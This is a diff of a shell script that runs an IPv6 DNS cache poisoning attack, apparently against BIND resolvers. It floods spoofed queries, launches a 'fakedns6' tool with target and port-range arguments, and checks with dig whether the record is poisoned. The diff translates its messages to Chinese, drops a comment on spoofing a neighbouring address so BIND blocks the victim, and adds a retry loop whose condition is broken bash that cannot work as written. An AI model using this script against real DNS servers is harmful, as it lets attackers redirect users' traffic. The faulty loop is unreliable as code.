@@ -3,32 +3,31 @@
 # Please run with sudo.
 
 # Verify the existing record domain, just for proof purposes.
-echo 'Before attack:'
+echo '原记录:'
 dig @$1 $4 AAAA
-echo '10s to start attack...'
-sleep 10
 
-# flood
-# This is specifically for BIND. To prevent it from answering queries sent by 1.2.3.4, we spoof 1.2.3.250 to flood queries. BIND will then block all queries from the same /24 network.
-#sh ./dns_query.sh $5 `echo $1 | sed -E 's/\.[0-9]*$/\.250/g'` 789 `echo $4 | sed "s/\./ /g"`
-bash ./dns_query.sh $5 `echo $1` 789 `echo $4 | sed "s/\./ /g"`
 
-# Start attack
-# Change the argument accordingly
-time ./fakedns6 -a $5 -b $1 -i $3 -n $4 -r $1 -t 50000 -ad $2 -tg 0 -s 10000 -e 65000 -j 0
-
-# Attack finished
-# Kill the flooding process.
-# pkill hping
-# Validations
-echo 'After attack:'
-dig @$1 $4 AAAA
-echo 'If there is no change in result, please wait for the original cache to expire. Otherwise please terminate the attack by Ctrl-C.'
-sleeptime=`dig @$1 $4 AAAA | grep -o -P '[0-9]+[ \t]*IN' | head -n 1 | sed 's/IN//g'`
-echo "Wait for $sleeptime seconds..."
-sleep $sleeptime
-echo 'Cache should be poisoned now:'
-dig @$1 $4 AAAA
-echo 'Wait for another 2 seconds...'
+success=0
+while $success!=1
+do
+  success=0
+  echo '10秒之后开始攻击...'
+  sleep 10
+  echo "开始攻击"
+  # flood
+  success=$(bash ./dns_query.sh $5 `echo $1` 789 `echo $4 | sed "s/\./ /g"`)
+  # Start attack
+  # Change the argument accordingly
+  time ./fakedns6 -a $5 -b $1 -i $3 -n $4 -r $1 -t 50000 -at $2 -tg 0 -s 10000 -e 65000 -j 0
+  # Validations
+  echo '攻击之后'
+  dig @$1 $4 AAAA
+  echo '如果结果未改变, 需要等待原缓存过期. 或者按 Ctrl-C取消攻击.'
+  echo "等待缓存过期"
+done
+# success
+echo '检测到攻击成功实现'
+echo '等待两秒，再次请求...'
 sleep 2
 dig @$1 $4 AAAA
+echo '攻击已完成！！！！'
